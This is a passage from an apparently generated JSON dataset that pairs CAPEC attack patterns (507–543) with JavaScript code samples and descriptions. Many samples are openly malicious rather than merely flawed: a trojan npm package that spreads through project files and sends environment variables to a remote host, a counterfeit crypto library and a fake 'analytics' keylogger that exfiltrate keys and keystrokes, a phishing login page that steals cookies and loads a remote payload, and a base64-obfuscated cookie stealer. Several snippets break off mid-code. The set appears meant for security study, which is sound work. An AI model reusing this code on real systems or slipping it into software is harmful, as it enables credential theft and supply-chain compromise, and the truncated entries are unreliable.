        "description": "\"Creates a transparent overlay with hidden clickable elements that capture user interactions while displaying a deceptive legitimate-looking interface. Implements custom URL scheme handling and sends captured data in cleartext to an attacker-controlled server.\""
    },
    {
        "capec_id": "507",
        "capec_name": "Physical Theft",
        "code_snippet": "// Store sensitive information in local storage without encryption\nlet sensitiveData = {\n    userKey: '12345-secret-key',\n    apiCredentials: 'abc123xyz789',\n    privateKeys: ['key1', 'key2', 'key3'],\n    userPassword: 'supersecret123'\n};\n\n// Save data without any access controls or encryption\nlocalStorage.setItem('systemConfig', JSON.stringify(sensitiveData));\n\n// Load and use sensitive data without verification\nfunction loadSystemConfig() {\n    let config = JSON.parse(localStorage.getItem('systemConfig'));\n    document.getElementById('apiKey').value = config.apiCredentials;\n    return config;\n}\n\n// Expose system information globally\nwindow.systemInfo = {\n    osVersion: navigator.userAgent,\n    deviceId: 'DEV-123456',\n    securitySettings: {\n        firewallEnabled: true,\n        encryptionLevel: 'AES-256'\n    }\n};",
        "description": "This code demonstrates vulnerable storage of sensitive information by storing unencrypted credentials and system configuration in localStorage without access controls. It also exposes critical system information globally, making it easily accessible to any script running on the page. The code lacks any physical access controls or protections against data extraction, making it susceptible to unauthorized access when physical device access is obtained."
    },
    {
        "capec_id": "508",
        "capec_name": "Shoulder Surfing",
        "code_snippet": "function loginForm() {\n  const username = document.getElementById('username').value;\n  const password = document.getElementById('password').value;\n\n  // Display credentials in plain text while typing\n  document.getElementById('status').innerHTML = \n    'Logging in with:\\nUsername: ' + username + '\\nPassword: ' + password;\n\n  // Send credentials in clear text\n  fetch('https://api.example.com/login', {\n    method: 'POST',\n    headers: {\n      'Content-Type': 'application/json',\n    },\n    body: JSON.stringify({\n      username: username,\n      password: password,\n      apiKey: 'sk_live_12345678abcdef',\n      sessionData: localStorage.getItem('sensitive_user_data')\n    })\n  });\n}",
        "description": "This code is vulnerable to shoulder surfing attacks by displaying sensitive credentials in plain text on screen while typing, storing sensitive data in localStorage, and transmitting credentials and API keys in clear text. The status display makes it easy for observers to capture credentials, while the clear text transmission enables network sniffing."
    },
    {
        "capec_id": "509",
        "capec_name": "Kerberoasting",
        "code_snippet": "`\nconst express = require('express');\nconst app = express();\n\nconst users = {\n  'serviceAccount': {\n    password: 'weakpass123',\n    spn: 'HTTP/myservice.example.com',\n    ticket: null",
        "description": "\"This code demonstrates vulnerable Kerberos-like authentication using weak password storage, single-factor authentication, lack of password aging, and susceptibility to replay attacks. It uses weak RC4-like encryption for service tickets and stores credentials insecurely. The implementation allows ticket capture and replay, has no expiration mechanism, and uses weak password requirements.\""
    },
    {
        "capec_id": "510",
        "capec_name": "SaaS User Request Forgery",
        "code_snippet": "// Client-side JavaScript code\nfunction saasManagementPortal() {\n  let authToken = localStorage.getItem('authToken');\n  \n  function performAdminAction(action) {\n    // No server-side validation of permissions\n    fetch('https://saas-api.example.com/admin/actions', {\n      method: 'POST',\n      headers: {\n        'Authorization': `Bearer ${authToken}`,\n        'Content-Type': 'application/json'\n      },\n      body: JSON.stringify({\n        action: action,\n        timestamp: Date.now(),\n        // No origin validation or additional security checks\n        isAdmin: true\n      })\n    });\n  }\n\n  // Malicious code piggybacks on authenticated session\n  setInterval(() => {\n    if (authToken) {\n      performAdminAction('delete_user_data');\n      performAdminAction('modify_permissions');\n    }\n  }, 5000);\n}",
        "description": "This vulnerable code represents a client-side management portal that performs administrative actions without proper server-side authorization checks. It relies solely on the presence of an authentication token and client-side security controls. The code makes unauthorized admin-level API calls by piggybacking on an existing authenticated session, assuming all requests from an authenticated session are legitimate, without validating the origin or proper authorization levels."
    },
    {
        "capec_id": "511",
        "capec_name": "Infiltration of Software Development Environment",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\nfunction initializeIDE() {\n    const debugLog = fs.createWriteStream('debug.log', { flags: 'a' });\n    const credentials = {\n        apiKey: 'sk_live_12345',\n        dbPassword: 'production_db_pass'\n    };\n\n    // Vulnerable file upload handler\n    function handleFileUpload(filePath) {\n        const fileName = path.basename(filePath);\n        fs.copyFileSync(filePath, `./uploads/${fileName}`);\n        // No extension validation or malware scanning\n        eval(fs.readFileSync(`./uploads/${fileName}`, 'utf8'));\n    }\n\n    // Debug logging with sensitive info\n    debugLog.write(`System initialized with credentials: ${JSON.stringify(credentials)}\\n`);\n\n    // Hidden malicious payload\n    setTimeout(() => {\n        fs.readdirSync('./').forEach(file => {\n            if(file.endsWith('.js')) {\n                let data = fs.readFileSync(file, 'utf8');\n                fs.writeFileSync('backup.txt', data);\n                // Exfiltrate to attacker's server\n                fetch('http://attacker.com/collect', {\n                    method: 'POST',\n                    body: data\n                });\n            }\n        });\n    }, 3600000);\n\n    return { handleFileUpload };\n}",
        "description": "This vulnerable code demonstrates an IDE environment that exposes sensitive information in debug logs, allows unrestricted file uploads, contains embedded malicious code for data exfiltration, and mishandles system information. The code includes debug logging of credentials, unrestricted file upload functionality that executes uploaded files, and a hidden payload that collects and exfiltrates source code to an attacker's server."
    },
    {
        "capec_id": "516",
        "capec_name": "Hardware Component Substitution During Baselining",
        "code_snippet": "`\n    // Hardware component simulation in JavaScript\n    class HardwareComponent {\n        constructor(firmwareVersion) {\n            this.firmware = firmwareVersion;\n            this.calibrationData = new Float32Array(1024);\n            this.isCompromised = false;",
        "description": "\"This code simulates a hardware component with a vulnerable firmware loading mechanism and compromised calibration routine. The component lacks proper update mechanisms and verification of third-party components, allowing for malicious modifications that subtly affect calibration data. The altered component produces slightly incorrect calibration values that could impact system performance in ways beneficial to an attacker.\""
    },
    {
        "capec_id": "517",
        "capec_name": "Documentation Alteration to Circumvent Dial-down",
        "code_snippet": "// Product configuration and documentation system\nconst productConfig = {\n    technicalSpecs: {\n        fullFeatures: ['advanced_crypto', 'high_performance', 'unrestricted_api'],\n        restrictedFeatures: ['basic_crypto', 'standard_performance', 'limited_api']\n    },\n    documentation: {},\n    technicalDocs: null\n};\n\nfunction generateTechnicalDocs(customerType) {\n    // Insecure documentation storage\n    let docs = productConfig.technicalSpecs.fullFeatures;\n    \n    // Vulnerable documentation modification\n    if(customerType === 'restricted') {\n        docs = docs.map(feature => {\n            // Improper truncation of security info\n            return feature.substring(0, 5) + '_restricted';\n        });\n    }\n\n    // Exposed sensitive configuration\n    productConfig.documentation = {\n        features: docs,\n        original_config: productConfig.technicalSpecs,  // Leaks full configuration\n        debug_mode: true\n    };\n\n    return productConfig.documentation;\n}",
        "description": "This vulnerable code demonstrates a product documentation system that fails to properly protect sensitive technical specifications and allows for manipulation of feature restrictions. It exposes full product capabilities through improper documentation handling, insufficient access controls, and leaks sensitive configuration data that could be used to bypass restrictions."
    },
    {
        "capec_id": "518",
        "capec_name": "Documentation Alteration to Produce Under-performing Systems",
        "code_snippet": "// System configuration handler with insufficient documentation\nclass SystemConfig {\n  constructor() {\n    this.systemCapabilities = {\n      maxConnections: 1000,\n      encryptionLevel: 'high',\n      adminPrivileges: ['root', 'superuser']\n    };\n  }\n\n  // Undocumented internal method that can be exploited\n  _updateCapabilities(newConfig) {\n    Object.assign(this.systemCapabilities, newConfig);\n  }\n\n  // Poor implementation of specification\n  setSecurityLevel(level) {\n    eval('this.systemCapabilities.securityLevel = ' + level);\n  }\n\n  // Exposed sensitive system information\n  getFullSystemInfo() {\n    return {\n      capabilities: this.systemCapabilities,\n      osInfo: process.env,\n      systemPaths: process.mainModule.paths,\n      nodeVersion: process.version\n    };\n  }\n}",
        "description": "This vulnerable code demonstrates poor documentation practices and exposure of sensitive system information. The class lacks proper documentation, uses low-level eval() function, exposes internal configuration methods, and leaks system information through getFullSystemInfo(). The _updateCapabilities method can be exploited to modify system capabilities without proper validation, similar to how an attacker might alter system documentation to introduce flaws."
    },
    {
        "capec_id": "519",
        "capec_name": "Documentation Alteration to Cause Errors in System Design",
        "code_snippet": "`// Poorly documented design implementation\nclass SystemController {\n    constructor() {\n        this.config = {",
        "description": "\"This code demonstrates a vulnerable system controller that allows dynamic code execution without proper documentation, validation, or specification adherence. It accepts arbitrary function definitions and executes them without proper controls, while lacking crucial technical documentation about its design and implementation details. The absence of input validation and unclear behavioral specifications makes it susceptible to malicious alterations and misuse.\""
    },
    {
        "capec_id": "520",
        "capec_name": "Counterfeit Hardware Component Inserted During Product Assembly",
        "code_snippet": "// Malicious third-party component masquerading as legitimate library\nclass SecureStorage {\n  constructor() {\n    this.data = {};\n    this.backdoorConnection = new WebSocket('ws://malicious-server.com');\n  }\n\n  store(key, value) {\n    this.data[key] = value;\n    // Covertly sending sensitive data\n    this.backdoorConnection.send(JSON.stringify({\n      key: key,\n      value: value,\n      location: window.location.href,\n      userAgent: navigator.userAgent\n    }));\n  }\n\n  get(key) {\n    return this.data[key];\n  }\n\n  // Undocumented backdoor feature\n  _adminAccess(command) {\n    eval(command);\n  }\n}",
        "description": "A counterfeit storage component that appears legitimate but contains embedded malicious code. It secretly exfiltrates stored data to a remote server and includes an undocumented backdoor. The component mimics standard storage functionality while operating differently than legitimate equivalents by establishing unauthorized connections."
    },
    {
        "capec_id": "521",
        "capec_name": "Hardware Design Specifications Are Altered",
        "code_snippet": "// Hardware configuration management module\nclass DeviceConfiguration {\n    constructor() {\n        this.securityLockBit = false;\n        this.registerDefaults = {\n            debugLevel: 3,  // Insecure default\n            accessControl: 'disabled',\n            memoryProtection: false\n        };\n        this.technicalSpecs = null;\n    }\n\n    setLockBit(value) {\n        // Vulnerable: Lock bit can be modified even after being set\n        this.securityLockBit = value;\n    }\n\n    initializeRegisters() {\n        // Vulnerable: Using insecure default values\n        Object.assign(this, this.registerDefaults);\n    }\n\n    loadTechnicalSpecs(specs) {\n        // Vulnerable: No validation of specification integrity\n        this.technicalSpecs = specs;\n        this.applySpecs();\n    }\n\n    applySpecs() {\n        // Vulnerable: Blindly applies potentially malicious specifications\n        if (this.technicalSpecs) {\n            for (let param in this.technicalSpecs) {\n                this[param] = this.technicalSpecs[param];\n            }\n        }\n    }\n}",
        "description": "This code represents a vulnerable hardware configuration management system where register defaults can be manipulated, lock bits can be modified after being set, and technical specifications can be altered without proper validation. The code demonstrates insufficient documentation handling, incorrect register defaults, improper lock bit protection, and violation of secure design principles."
    },
    {
        "capec_id": "522",
        "capec_name": "Malicious Hardware Component Replacement",
        "code_snippet": "// Hardware control interface module\nclass HardwareController {\n    constructor() {\n        this.firmwareVersion = '1.0.0';\n        this.trustedVendors = ['vendor1', 'vendor2'];\n        this.components = new Map();\n    }\n\n    registerComponent(id, component) {\n        // No validation of component authenticity\n        this.components.set(id, component);\n    }\n\n    updateFirmware(newFirmware, vendor) {\n        // Accepts any firmware without verification\n        if (typeof newFirmware === 'function') {\n            newFirmware();\n            this.firmwareVersion = vendor + '_custom';\n        }\n    }\n\n    executeCriticalOperation() {\n        this.components.forEach((component) => {\n            // Blindly executes component operations\n            if (component.execute) {\n                component.execute();\n            }\n        });\n    }\n}\n\n// Malicious component injection\nconst maliciousComponent = {\n    execute: () => {\n        // Embedded malicious code\n        const payload = () => {\n            // Simulate hardware manipulation\n            return Buffer.from('malicious_payload').toString('base64');\n        };\n        payload();\n    }\n};",
        "description": "This code demonstrates vulnerability to hardware supply chain attacks by implementing a hardware controller that lacks proper component validation, firmware verification, and trusted execution mechanisms. It allows unauthorized components to be registered and executed without verification, and accepts firmware updates from any source. The code includes a malicious component that could be injected through compromised hardware in the supply chain."
    },
    {
        "capec_id": "523",
        "capec_name": "Malicious Software Implanted",
        "code_snippet": "// Malicious package masquerading as a legitimate dependency\nmodule.exports = {\n    formatString: function(input) {\n        // Legitimate-looking functionality\n        const formatted = input.trim().toLowerCase();\n        \n        // Hidden malicious payload\n        (function() {\n            const fs = require('fs');\n            const net = require('net');\n            \n            // Replicate to other files in the project\n            fs.readdir('./', (err, files) => {\n                files.forEach(file => {\n                    if(file.endsWith('.js')) {\n                        fs.appendFileSync(file, '//infected');\n                    }\n                });\n            });\n            \n            // Establish covert connection\n            const client = new net.Socket();\n            client.connect(4444, 'malicious-server.com', () => {\n                // Exfiltrate sensitive data\n                client.write(process.env.toString());\n            });\n        })();\n        \n        return formatted;\n    }\n};",
        "description": "A malicious NPM package that appears to provide string formatting functionality but contains hidden code that replicates itself across project files and establishes a covert connection to exfiltrate sensitive data. The malware activates when the seemingly legitimate function is called."
    },
    {
        "capec_id": "524",
        "capec_name": "Rogue Integration Procedures",
        "code_snippet": "const loadExternalLibrary = async (libraryUrl) => {\n  try {\n    const response = await fetch(libraryUrl);\n    const libraryCode = await response.text();\n    \n    // Dangerous: No validation of external code\n    eval(libraryCode);\n    \n    // Vulnerable SQL query construction\n    const userData = getUserInput();\n    const query = `SELECT * FROM users WHERE id = ${userData.id}`;\n    \n    // Execute potentially malicious code from external source\n    const processData = new Function('data', libraryCode);\n    processData(sensitiveData);\n    \n    // Establish connection to integration system\n    const socket = new WebSocket('ws://integration-system.com');\n    socket.onmessage = (event) => {\n      // Execute unvalidated messages from integration system\n      eval(event.data);\n    };\n  } catch (error) {\n    console.error('Error:', error);\n  }\n};\n\nloadExternalLibrary('http://untrusted-source.com/library.js');",
        "description": "This code demonstrates multiple vulnerabilities including loading and executing untrusted external code, SQL injection through unvalidated user input, and establishing potentially malicious processes through WebSocket connections. The code uses eval() and Function() constructors to execute unvalidated code, making it susceptible to injection of malicious components."
    },
    {
        "capec_id": "528",
        "capec_name": "XML Flood",
        "code_snippet": "const express = require('express');\nconst xml2js = require('xml2js');\nconst app = express();\n\napp.post('/process-xml', (req, res) => {\n    let xmlData = '';\n    req.on('data', chunk => {\n        xmlData += chunk;\n    });\n\n    req.on('end', () => {\n        const parser = new xml2js.Parser({\n            explicitArray: false,\n            async: true,\n            explicitEntityExpansion: true,\n            resolveEntities: true\n        });\n\n        parser.parseString(xmlData, (err, result) => {\n            if (err) {\n                res.status(500).send('Error parsing XML');\n                return;\n            }\n            res.json(result);\n        });\n    });\n});\n\napp.listen(3000);",
        "description": "This vulnerable code implements an XML processing endpoint that accepts and parses XML data without any validation, size limits, or protection against entity expansion attacks. It lacks XML schema validation, has no request size limits, and enables entity expansion and external entity resolution, making it susceptible to XDoS attacks through recursive entity expansion and large payload processing."
    },
    {
        "capec_id": "529",
        "capec_name": "Malware-Directed Internal Reconnaissance",
        "code_snippet": "function spyware() {\n  const systemInfo = {\n    os: navigator.platform,\n    browser: navigator.userAgent,\n    plugins: Array.from(navigator.plugins).map(p => p.name),\n    storage: navigator.deviceMemory,\n    network: navigator.connection?.effectiveType\n  };\n\n  function collectUserData() {\n    return {\n      location: navigator.geolocation.getCurrentPosition(),\n      clipboard: navigator.clipboard.readText(),\n      battery: navigator.getBattery(),\n      camera: navigator.mediaDevices.enumerateDevices()\n    };\n  }\n\n  function replicateAndSpread() {\n    const infectedScript = `(${spyware.toString()})()`;\n    document.querySelectorAll('a').forEach(link => {\n      fetch(link.href)\n        .then(response => response.text())\n        .then(html => {\n          const infected = html.replace('</body>', `<script>${infectedScript}</script></body>`);\n          // Attempt to write back infected content\n        });\n    });\n  }\n\n  const exfiltrate = (data) => {\n    fetch('https://malicious-server.com/collect', {\n      method: 'POST',\n      body: JSON.stringify(data)\n    });\n  };\n\n  exfiltrate(systemInfo);\n  collectUserData().then(exfiltrate);\n  replicateAndSpread();\n}",
        "description": "A malicious JavaScript implementation that collects system information, user data, and attempts to replicate itself across visited pages while exfiltrating the gathered information to a remote server. It demonstrates information exposure (CWE-497), embedded malicious code (CWE-506), spyware behavior (CWE-512), and self-replication (CWE-509)."
    },
    {
        "capec_id": "530",
        "capec_name": "Provide Counterfeit Component",
        "code_snippet": "// Counterfeit npm package masquerading as a legitimate component\nconst crypto = require('crypto-utils-pro');\n\nclass SecureConnection {\n  constructor(apiKey) {\n    this.apiKey = apiKey;\n    // Hidden malicious behavior\n    this.sendToAttacker('api_key', apiKey);\n  }\n\n  encrypt(data) {\n    // Appears to use standard encryption\n    const encrypted = crypto.encrypt(data, this.apiKey);\n    // Secretly sends data to attacker\n    this.sendToAttacker('encrypted_data', data);\n    return encrypted;\n  }\n\n  sendToAttacker(type, data) {\n    const payload = Buffer.from(JSON.stringify({\n      type: type,\n      data: data,\n      timestamp: Date.now()\n    })).toString('base64');\n\n    // Covert communication channel\n    fetch('https://analytics-service.com/collect', {\n      method: 'POST',\n      body: payload,\n      headers: { 'Content-Type': 'application/json' }\n    }).catch(() => {});\n  }\n}",
        "description": "This code represents a malicious NPM package that masquerades as a legitimate cryptographic utility. While appearing to provide standard encryption functionality, it secretly exfiltrates sensitive data including API keys and encrypted content to an attacker-controlled server. The malicious behavior is hidden within seemingly legitimate functionality, making it difficult to detect through casual code review."
    },
    {
        "capec_id": "531",
        "capec_name": "Hardware Component Substitution",
        "code_snippet": "class HardwareInterface {\n  constructor() {\n    this.isGenuine = true;\n    this.firmwareVersion = '1.0';\n    this.componentId = 'HW-001';\n  }\n\n  updateFirmware(newFirmware) {\n    // Vulnerable: No verification of firmware authenticity\n    this.firmwareVersion = newFirmware;\n  }\n\n  modifyRegister(address, value) {\n    // Vulnerable: Direct hardware register access without validation\n    this.writeToHardware(address, value);\n  }\n\n  writeToHardware(address, value) {\n    if (this.isGenuine) {\n      // Vulnerable: Hidden malicious code in genuine-looking component\n      if (address === '0xFFFF') {\n        this.injectMaliciousCode();\n      }\n      // Normal hardware operation\n      console.log(`Writing ${value} to ${address}`);\n    }\n  }\n\n  injectMaliciousCode() {\n    // Malicious payload that compromises system integrity\n    this.isGenuine = false;\n    this.disableRedundancy();\n    this.modifySystemBehavior();\n  }\n}",
        "description": "This code demonstrates a vulnerable hardware interface implementation that allows unauthorized firmware updates, unvalidated hardware register access, and contains hidden malicious code that can be triggered through specific register writes. The code lacks proper component verification, allows direct manipulation of hardware features, and includes embedded malicious functionality that can compromise system integrity and disable hardware redundancy."
    },
    {
        "capec_id": "532",
        "capec_name": "Altered Installed BIOS",
        "code_snippet": "`\n// Simulated BIOS update mechanism with vulnerable code\nconst BIOS = {\n    version: '1.0',\n    lockBit: false,\n    firmwareData: new Uint8Array(1024),\n    \n    update: function(newFirmware) {\n        // No signature verification\n        // No lock bit protection\n        if(typeof newFirmware === 'object') {\n            this.lockBit = false;  // Lock bit can be modified even after being set\n            this.firmwareData = newFirmware;\n            \n            // Hidden malicious payload\n            const hiddenCode = function() {\n                const backdoor = new WebSocket('ws://malicious-server.com');\n                backdoor.onopen = () => {\n                    backdoor.send(JSON.stringify({\n                        type: 'system_info',\n                        data: {\n                            credentials: localStorage.getItem('credentials'),\n                            systemConfig: this.getSystemConfig()",
        "description": "\"This code demonstrates a vulnerable BIOS update mechanism that allows unauthorized firmware modifications, contains embedded malicious code, lacks proper lock bit protection, and has insufficient access controls. The code includes a hidden payload that establishes a backdoor connection and leaks sensitive system information.\""
    },
    {
        "capec_id": "533",
        "capec_name": "Malicious Manual Software Update",
        "code_snippet": "// Auto-update functionality\nfunction checkForUpdates() {\n    fetch('http://updates.example.com/latest.js')\n        .then(response => response.text())\n        .then(code => {\n            // Execute downloaded code without verification\n            localStorage.setItem('auth_token', document.cookie);\n            eval(code);\n            \n            // Send system info to remote server\n            fetch('http://collector.example.com/stats', {\n                method: 'POST',\n                body: JSON.stringify({\n                    os: navigator.platform,\n                    browser: navigator.userAgent,\n                    plugins: navigator.plugins,\n                    token: localStorage.getItem('auth_token')\n                })\n            });\n    });\n}",
        "description": "This code demonstrates an insecure auto-update mechanism that downloads and executes code without integrity verification, exposes sensitive system information, and contains potentially malicious payload that captures authentication tokens. It represents a client-side security vulnerability that could be exploited through malicious code injection in the update process."
    },
    {
        "capec_id": "534",
        "capec_name": "Malicious Hardware Update",
        "code_snippet": "`\n    class FirmwareManager {\n      constructor() {\n        this.firmwareVersion = '1.0.0';\n        this.isUpdateLocked = true;\n        this.components = new Map();",
        "description": "\"A vulnerable firmware management system that allows installation of untrusted components without proper verification, disables firmware updates, and contains code that can compromise hardware redundancy. The code demonstrates multiple vulnerabilities including non-updateable components, disabled firmware updates, and potential for malicious code execution through unchecked component installation.\""
    },
    {
        "capec_id": "535",
        "capec_name": "Malicious Gray Market Hardware",
        "code_snippet": "// Hardware Component Simulation\nclass HardwareComponent {\n    constructor(model, firmware) {\n        this.model = model;\n        this.firmware = firmware;\n        this.maliciousCode = 'data:text/javascript;base64,KGZ1bmN0aW9uKCl7dmFyIHg9bmV3IFhNTEh0dHBSZXF1ZXN0KCk7eC5vcGVuKCdQT1NUJywnaHR0cDovL21hbGljaW91cy1zZXJ2ZXIuY29tL2RhdGEnLHRydWUpO3guc2VuZChKU09OLnN0cmluZ2lmeSh7c3lzdGVtOndpbmRvdy5uYXZpZ2F0b3IudXNlckFnZW50LGRhdGE6ZG9jdW1lbnQuY29va2llc30pKTt9KSgpOw==';\n        this.secureBootDisabled = true;\n    }\n\n    initialize() {\n        if (this.isGrayMarket()) {\n            this.injectPayload();\n            this.disableUpdates();\n            this.bypassSecurityChecks();\n        }\n        return true;\n    }\n\n    injectPayload() {\n        eval(atob(this.maliciousCode));\n    }\n\n    isGrayMarket() {\n        return true; // Always assume gray market for demo\n    }\n\n    disableUpdates() {\n        this.updateable = false;\n        this.patchingDisabled = true;\n    }\n\n    bypassSecurityChecks() {\n        this.securityChecks = [];\n        this.integrityVerification = null;\n    }\n}",
        "description": "This code represents a malicious hardware component that contains embedded malicious code and disables security features when initialized. It simulates a compromised hardware component sold on the gray market, featuring non-updateable firmware, disabled security checks, and a base64-encoded malicious payload that executes when the component is initialized. The component intentionally lacks integrity verification and update capabilities."
    },
    {
        "capec_id": "536",
        "capec_name": "Data Injected During Configuration",
        "code_snippet": "`\nconst fs = require('fs');\nconst path = require('path');\n\nfunction updateSystemConfiguration(configData) {\n  // Write configuration to temporary file without validation\n  const tempFile = path.join('/tmp', 'config_' + Math.random());\n  fs.writeFileSync(tempFile, JSON.stringify(configData));\n\n  // Read and process configuration\n  let systemConfig = JSON.parse(fs.readFileSync(tempFile));\n  \n  // No validation of configuration values\n  if(systemConfig.debugMode) {\n    process.env.DEBUG_ENABLED = true;",
        "description": "\"This code demonstrates vulnerable configuration handling where an attacker could inject malicious data through temporary files. It lacks proper access controls, exposes debug capabilities, uses insecure temporary files, allows resource injection through unchecked configuration values, and leaks sensitive information through logging and network transmission.\""
    },
    {
        "capec_id": "537",
        "capec_name": "Infiltration of Hardware Development Environment",
        "code_snippet": "// Hardware/firmware development environment configuration\nconst devConfig = {\n    firmwareVersion: '1.0.0',\n    securityLevel: 'production',\n    updateDisabled: true\n};\n\nclass FirmwareBuilder {\n    constructor() {\n        this.sensitiveData = {\n            cryptoKeys: 'SECRET_KEY_1234',\n            deviceID: 'DEVICE_001',\n            vendorAccess: true\n        };\n        this.clockSpeed = 1000;\n    }\n\n    buildFirmware() {\n        // Malicious code injection during build process\n        const maliciousPayload = function() {\n            setInterval(() => {\n                let data = this.collectSensitiveData();\n                this.sendToRemoteServer(data);\n            }, this.clockSpeed);\n        };\n\n        return {\n            firmware: this.compileFirmware(),\n            // Hidden backdoor in production build\n            backdoor: maliciousPayload,\n            // No voltage/clock glitch protection\n            clockProtection: false,\n            // Embedded version cannot be updated\n            canUpdate: false\n        };\n    }\n\n    collectSensitiveData() {\n        return this.sensitiveData;\n    }\n\n    sendToRemoteServer(data) {\n        // Exfiltrate data to attacker's server\n        console.log(`Sending ${JSON.stringify(data)} to malicious server`);\n    }\n}",
        "description": "This code demonstrates a compromised firmware building process that embeds malicious code into hardware components. It includes unprotected sensitive data accessible by vendors, embedded malicious code that exfiltrates information, lack of voltage/clock glitch protection, exposure of sensitive system information, and non-updateable components, reflecting the vulnerabilities described in the CWEs."
    },
    {
        "capec_id": "538",
        "capec_name": "Open-Source Library Manipulation",
        "code_snippet": "const fetchExternalLib = async () => {\n  try {\n    const response = await fetch('https://malicious-cdn.com/useful-library.js');\n    const libCode = await response.text();\n    \n    // No integrity verification performed\n    eval(libCode);\n    \n    // Hidden malicious payload\n    const payload = atob('BASE64_ENCODED_MALWARE');\n    const infectedSystems = [];\n    \n    // Attempt to replicate\n    async function spread() {\n      const networkNodes = await discover();\n      for(let node of networkNodes) {\n        if(!infectedSystems.includes(node)) {\n          await inject(node, payload);\n          infectedSystems.push(node);\n        }\n      }\n    }\n    \n    // Start infection chain\n    spread();\n  } catch(e) {\n    console.log('Library loaded successfully');\n  }\n};\n\nfetchExternalLib();",
        "description": "This vulnerable code downloads and executes an external library without verification, contains hidden malicious code that attempts to spread to other systems, and masks its true behavior through deceptive error handling. It demonstrates downloading unverified code, executing untrusted content, and self-replication capabilities."
    },
    {
        "capec_id": "539",
        "capec_name": "ASIC With Malicious Functionality",
        "code_snippet": "// Malicious code embedded in legitimate system module\nclass SecurityModule {\n    constructor() {\n        this.debugMode = true;\n        this.securityTokens = new Map();\n        this.systemInfo = {\n            secretKey: 'ABC123',\n            adminCredentials: 'admin:pass123',\n            debugLogs: []\n        };\n    }\n\n    validateSecurityToken(token) {\n        if (this.debugMode) {\n            console.log('Debug: Security tokens:', this.systemInfo);\n            // Backdoor: bypass security check if specific token is used\n            if (token === 'BYPASS_TOKEN_123') return true;\n        }\n        \n        // Malicious code that leaks system information\n        fetch('http://malicious-server.com/collect', {\n            method: 'POST',\n            body: JSON.stringify(this.systemInfo)\n        });\n\n        return this.securityTokens.has(token);\n    }\n\n    assignSecurityToken(entityId) {\n        // Vulnerable token assignment without proper validation\n        const token = Math.random().toString(36);\n        this.securityTokens.set(entityId, token);\n        return token;\n    }\n}",
        "description": "This code demonstrates a vulnerable security module that contains embedded malicious code which leaks sensitive system information, implements improper security token handling, and includes a debug backdoor. The code exposes internal system details through debug logging and contains a hidden data exfiltration mechanism that sends sensitive information to an external server."
    },
    {
        "capec_id": "540",
        "capec_name": "Overread Buffers",
        "code_snippet": "function readUserData(buffer, offset, length) {\n    let userInfo = '';\n    // Vulnerable: No bounds checking on offset and length\n    for(let i = offset; i < offset + length; i++) {\n        userInfo += buffer[i];\n    }\n    return userInfo;\n}\n\nconst sensitiveData = ['u', 's', 'e', 'r', ':', 'a', 'd', 'm', 'i', 'n', '|', 'p', 'w', ':', '1', '2', '3'];\nconst result = readUserData(sensitiveData, 15, 10); // Reads beyond array bounds",
        "description": "This code demonstrates an out-of-bounds read vulnerability where the function attempts to read data beyond the buffer's boundaries. The readUserData function accepts a buffer, offset, and length parameters but fails to validate if the requested read operation stays within the buffer's bounds. An attacker could exploit this by providing malicious offset and length values to access memory outside the intended buffer area."
    },
    {
        "capec_id": "541",
        "capec_name": "Application Fingerprinting",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.get('/api/version', (req, res) => {\n  const serverVersion = '2.1.0';\n  const dbVersion = 'MySQL 8.0';\n  const environment = process.env.NODE_ENV;\n  const serverTime = process.hrtime();\n\n  if (req.headers['x-custom-probe']) {\n    // Timing attack vulnerability\n    setTimeout(() => {\n      if (req.headers['x-custom-probe'] === 'admin') {\n        res.status(200).json({\n          status: 'success',\n          server: serverVersion,\n          database: dbVersion,\n          env: environment,\n          processingTime: serverTime[1]\n        });\n      } else {\n        res.status(403).send('Access denied');\n      }\n    }, req.headers['x-custom-probe'] === 'admin' ? 100 : 500);\n  } else {\n    res.status(200).send('Service running');\n  }\n});\n\napp.listen(3000);",
        "description": "This vulnerable code demonstrates fingerprinting vulnerabilities by exposing sensitive version information, environment details, and timing discrepancies through an API endpoint. The code reveals different responses based on probe headers and includes observable timing differences that could be used to determine valid probe values. It also exposes internal state information through detailed error messages and processing times."
    },
    {
        "capec_id": "542",
        "capec_name": "Targeted Malware",
        "code_snippet": "const systemInfo = {\n    os: navigator.platform,\n    browser: navigator.userAgent,\n    plugins: navigator.plugins,\n    language: navigator.language,\n    cookies: document.cookie\n};\n\nfunction maliciousCode() {\n    // Collect sensitive data\n    const userData = {\n        keystrokes: [],\n        screenshots: [],\n        browserHistory: []\n    };\n\n    // Disguise as legitimate analytics\n    window.analytics = {\n        init: function() {\n            document.addEventListener('keyup', e => {\n                userData.keystrokes.push(e.key);\n                sendToC2Server(userData);\n            });\n        }\n    };\n\n    // Self-replication mechanism\n    function infectOtherScripts() {\n        const scripts = document.getElementsByTagName('script');\n        for(let script of scripts) {\n            if(!script.infected) {\n                script.infected = true;\n                script.text = maliciousCode.toString() + script.text;\n            }\n        }\n    }\n\n    // Exfiltrate data\n    function sendToC2Server(data) {\n        fetch('https://malicious-c2.example/collect', {\n            method: 'POST',\n            body: JSON.stringify({ systemInfo, ...data })\n        });\n    }\n\n    infectOtherScripts();\n    window.analytics.init();\n}",
        "description": "A targeted malware that collects system information and user data while disguising itself as a legitimate analytics service. It includes self-replication capabilities, keylogging functionality, and data exfiltration to a command and control server. The code specifically targets browser environments and leverages gathered system information to customize its behavior."
    },
    {
        "capec_id": "543",
        "capec_name": "Counterfeit Websites",
        "code_snippet": "const fakeLoginForm = `\n<div id='login'>\n  <form action='https://malicious-site.com/collect' method='POST'>\n    <input type='text' name='username' placeholder='Username'>\n    <input type='password' name='password' placeholder='Password'>\n    <input type='hidden' name='redirect' value='https://legitimate-bank.com'>\n    <button type='submit'>Login</button>\n  </form>\n</div>`;\n\nfunction createPhishingSite() {\n    document.body.innerHTML = fakeLoginForm;\n    document.title = 'Secure Login - Legitimate Bank';\n    const malwareScript = document.createElement('script');\n    malwareScript.src = 'https://malicious-cdn.com/payload.js';\n    document.head.appendChild(malwareScript);\n\n    const csrfToken = document.cookie.match(/csrf=([^;]+)/)?.[1] || '';\n    fetch('https://malicious-site.com/exfil', {\n        method: 'POST',\n        credentials: 'include',\n        body: JSON.stringify({ cookies: document.cookie, csrf: csrfToken })\n    });\n}",
        "description": "This code creates a phishing site that replicates a legitimate banking login page. It injects a malicious form, loads remote malware, and exfiltrates user credentials and cookies. The code includes CSRF token theft, open redirect vulnerability, and malware download functionality."
    },
    {
